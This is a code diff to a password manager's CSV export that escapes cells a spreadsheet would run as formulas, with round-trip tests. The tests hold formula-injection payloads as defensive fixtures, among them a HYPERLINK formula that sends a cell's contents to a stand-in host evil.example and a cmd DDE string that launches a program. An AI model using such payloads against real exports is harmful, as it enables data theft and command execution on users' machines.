@@ -9,6 +9,11 @@
 //!
 //! Both hold every secret in plain text: the app asks for the master password
 //! and warns before writing one.
+//!
+//! A CSV cell a spreadsheet would run as a formula (a website can choose an
+//! item's title and user name when it saves a passkey) is written with a
+//! leading `'`, which Keyless removes again on import. Passwords, one-time
+//! password secrets and notes are written as they are.
 
 use serde::Serialize;
 
@@ -27,6 +32,34 @@ fn one_line(value: &str) -> String {
     value.split(['\r', '\n']).filter(|l| !l.is_empty()).collect::<Vec<_>>().join(" ")
 }
 
+/// Whether a spreadsheet would read `value` as a formula that can run
+/// something or send data out: anything starting with `=`, and `+`, `-` or
+/// `@` followed by a function call or a link to another program. Phone
+/// numbers (`+55 11 …`) and handles (`@name`) are left alone.
+fn formula(value: &str) -> bool {
+    let call = || {
+        value.match_indices('(').any(|(i, _)| value[..i].trim_end().chars().next_back().is_some_and(|c| c.is_ascii_alphabetic() || c == '_' || c == '.'))
+    };
+    match value.chars().next() {
+        Some('=' | '\t' | '\r') => true,
+        Some('+' | '-' | '@') => value.contains('|') || call(),
+        _ => false,
+    }
+}
+
+/// `value` as a spreadsheet shows it, never run.
+fn spreadsheet_safe(value: String) -> String {
+    if formula(&value) { format!("'{value}") } else { value }
+}
+
+/// Undoes [`spreadsheet_safe`] for a cell read back.
+pub(crate) fn from_spreadsheet(value: String) -> String {
+    match value.strip_prefix('\'') {
+        Some(rest) if formula(rest) => rest.to_string(),
+        _ => value,
+    }
+}
+
 fn row(overview: &ItemOverview, details: &ItemDetails) -> [String; 11] {
     let login = matches!(overview.category, Category::Login | Category::Password);
     let username = details.field_by_purpose(FieldPurpose::Username);
@@ -41,15 +74,15 @@ fn row(overview: &ItemOverview, details: &ItemDetails) -> [String; 11] {
         .join("\n");
     let value = |field: Option<&Field>| if login { field.map(|f| f.value.clone()).unwrap_or_default() } else { String::new() };
     [
-        overview.tags.join(", "),
+        spreadsheet_safe(overview.tags.join(", ")),
         if overview.favorite { "1".into() } else { String::new() },
         if login { "login".into() } else { "note".into() },
-        overview.title.clone(),
+        spreadsheet_safe(overview.title.clone()),
         details.notes.clone(),
-        fields,
+        spreadsheet_safe(fields),
         "0".into(),
-        overview.urls.iter().map(|u| u.href.as_str()).collect::<Vec<_>>().join(","),
-        value(username),
+        spreadsheet_safe(overview.urls.iter().map(|u| u.href.as_str()).collect::<Vec<_>>().join(",")),
+        spreadsheet_safe(value(username)),
         value(password),
         value(totp),
     ]
@@ -146,6 +179,40 @@ mod tests {
         let card = &items[1];
         assert_eq!(card.overview.category, Category::SecureNote);
         assert!(card.details.all_fields().any(|f| f.label == "number" && f.value == "4111111111111111"));
+    }
+
+    #[test]
+    fn formulas_are_not_run() {
+        for (value, escaped) in [
+            ("=HYPERLINK(\"https://x/?\"&J5,\"x\")", true),
+            ("+HYPERLINK(\"https://x\")", true),
+            ("-cmd|' /C calc'!A0", true),
+            ("@SUM(A1:A9)", true),
+            ("\tx", true),
+            ("+55 (11) 99999-9999", false),
+            ("@diego", false),
+            ("- shopping list", false),
+            ("Example", false),
+        ] {
+            let safe = spreadsheet_safe(value.to_string());
+            assert_eq!(safe.starts_with('\''), escaped, "{value}");
+            assert_eq!(from_spreadsheet(safe), value);
+        }
+
+        let mut data = sample();
+        let item = &mut data.vaults[0].items[0];
+        item.overview.title = "=HYPERLINK(\"https://evil.example/?\"&J2,\"Open\")".into();
+        item.details.fields[0].value = "+SUM(1)".into();
+        item.details.fields[1].value = "=not-a-formula-but-a-password".into();
+        let csv = to_csv(&data).unwrap();
+        let text = String::from_utf8(csv.clone()).unwrap();
+        assert!(text.contains("\"'=HYPERLINK("));
+        assert!(text.contains(",'+SUM(1),=not-a-formula-but-a-password,"));
+        let imported = parse_csv(csv.as_slice(), "Personal").unwrap();
+        let login = &imported.vaults[0].items[0];
+        assert_eq!(login.overview.title, "=HYPERLINK(\"https://evil.example/?\"&J2,\"Open\")");
+        assert_eq!(login.details.username(), Some("+SUM(1)"));
+        assert_eq!(login.details.password(), Some("=not-a-formula-but-a-password"));
     }
 
     #[test]
